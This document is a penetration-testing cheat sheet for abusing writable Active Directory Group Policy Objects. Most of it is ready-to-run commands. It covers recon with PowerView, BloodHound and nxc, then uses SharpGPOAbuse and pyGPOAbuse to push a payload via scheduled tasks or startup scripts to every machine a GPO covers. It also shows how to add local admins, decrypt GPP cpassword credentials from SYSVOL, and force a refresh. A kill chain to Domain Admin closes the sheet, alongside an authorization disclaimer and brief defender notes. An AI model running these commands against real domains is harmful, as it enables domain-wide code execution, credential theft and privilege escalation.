GPO Abuse - Cheat Sheet

Abuse Group Policy Objects with write permissions to execute code on
every machine or user the GPO applies to. A single writable GPO =
domain-wide code execution. Replace <placeholders> with your own values.

>>> Only use on systems you own or are authorized to test. <<<


Recon: Find Writable GPOs

    # BloodHound — look for edges:
    #   GenericAll / GenericWrite / WriteDacl / WriteProperty on GPO objects
    #   "Shortest Path to Domain Admin" often goes through GPOs

    # SharpGPOAbuse recon (list GPOs you can modify)
    # first, identify GPO GUIDs you have write access to via BloodHound or PowerView

    # PowerView — find GPOs + who can edit them
    Get-DomainGPO | Select DisplayName, Name, gpcfilesyspath
    Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=<domain>,DC=local" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|GenericAll|GenericWrite" }

    # nxc — list GPOs
    nxc ldap <dc-ip> -u <user> -p <pass> -M gpp_autologin
    nxc ldap <dc-ip> -u <user> -p <pass> -M gpp_password

    # check which OUs/computers a GPO applies to
    Get-DomainOU -GPLink "<GPO-GUID>" | Select DistinguishedName
    gpresult /r          # on a target machine: see applied GPOs


SharpGPOAbuse (Windows — primary tool)

    # add an immediate scheduled task (runs on all machines in the GPO scope)
    SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c C:\Windows\Temp\payload.exe" --GPOName "<GPO-DisplayName>"

    # add a user to local administrators on all machines
    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <your-user> --GPOName "<GPO-DisplayName>"

    # add a user-level startup script (runs at user logon)
    SharpGPOAbuse.exe --AddUserScript --ScriptName "update.bat" --ScriptContents "C:\Windows\Temp\payload.exe" --GPOName "<GPO-DisplayName>"

    # add a computer startup script (runs at boot as SYSTEM)
    SharpGPOAbuse.exe --AddComputerScript --ScriptName "update.bat" --ScriptContents "C:\Windows\Temp\payload.exe" --GPOName "<GPO-DisplayName>"

    # force GPO refresh on targets (don't wait for 90-min cycle)
    # from the target: gpupdate /force
    # remotely via SharpGPOAbuse or Invoke-GPUpdate


pyGPOAbuse (Linux — impacket-based)

    # add an immediate scheduled task
    python3 pygpoabuse.py <domain>/<user>:<pass>@<dc-ip> -gpo-id "<GPO-GUID>" -command "cmd.exe /c C:\Windows\Temp\payload.exe" -taskname "Update" -f

    # add a computer startup script
    python3 pygpoabuse.py <domain>/<user>:<pass>@<dc-ip> -gpo-id "<GPO-GUID>" -command "C:\Windows\Temp\payload.exe" -f -startupscript

    # the -f flag forces the task type to "immediate" (runs ASAP, not on schedule)


GPO Scheduled Task (manual via SYSVOL edit)

    # if you have WRITE access to the GPO's SYSVOL path, you can add an
    # Immediate Scheduled Task directly by editing the XML:
    # \\<domain>\SYSVOL\<domain>\Policies\{<GPO-GUID>}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml

    # the task fires on the next gpupdate cycle (max 90 min, or forced)


GPP Passwords (Group Policy Preferences — legacy goldmine)

    # GPP stored credentials in SYSVOL in AES-encrypted XML
    # Microsoft published the AES key — instant decrypt

    # nxc
    nxc smb <dc-ip> -u <user> -p <pass> -M gpp_password
    nxc smb <dc-ip> -u <user> -p <pass> -M gpp_autologin

    # manual: search SYSVOL for cpassword
    findstr /S /I "cpassword" \\<domain>\SYSVOL\<domain>\Policies\*.xml

    # decrypt
    gpp-decrypt <cpassword-value>

    # files to check:
    #   Groups.xml, Services.xml, Scheduledtasks.xml
    #   DataSources.xml, Printers.xml, Drives.xml


Force GPO Update (speed up exploitation)

    # on target (if you have access)
    gpupdate /force

    # remotely via PowerShell (needs admin on target)
    Invoke-GPUpdate -Computer <target> -Force

    # remotely via SharpGPOAbuse
    SharpGPOAbuse.exe --Force --GPOName "<GPO-DisplayName>"

    # or just wait — default refresh is every 90 minutes (+ random 0-30 min)


Cleanup (critical — remove your GPO modifications)

    # SharpGPOAbuse
    SharpGPOAbuse.exe --RemoveComputerTask --TaskName "Update" --GPOName "<GPO-DisplayName>"
    SharpGPOAbuse.exe --RemoveLocalAdmin --UserAccount <your-user> --GPOName "<GPO-DisplayName>"

    # pyGPOAbuse: re-run with cleanup options or manually remove the XML from SYSVOL


Attack Paths (typical kill chain)

    1. Compromise a user with GenericWrite/WriteDacl on a GPO (find via BloodHound)
    2. Use SharpGPOAbuse/pyGPOAbuse to add a scheduled task or startup script
    3. Task executes your payload on every machine the GPO targets
    4. If the GPO applies to a DC → instant Domain Admin
    5. Clean up: remove your task/script from the GPO


Defender Notes (for the report)
  - Audit GPO modification: Event IDs 5136 (Directory Service Changes)
  - Restrict GPO write permissions (principle of least privilege)
  - Remove GPP passwords from SYSVOL (MS14-025 patch)
  - Monitor SYSVOL for unexpected XML changes
  - Advanced: GPO versioning — any modification bumps the version number


Key idea: if you can WRITE to a GPO, you can push code execution to every
machine in that GPO's scope — potentially the entire domain. BloodHound finds
the writable GPO, SharpGPOAbuse/pyGPOAbuse plants the scheduled task, and
gpupdate /force triggers it immediately. Always clean up afterward. Also check
SYSVOL for GPP passwords (cpassword) — it's a free win on older domains.
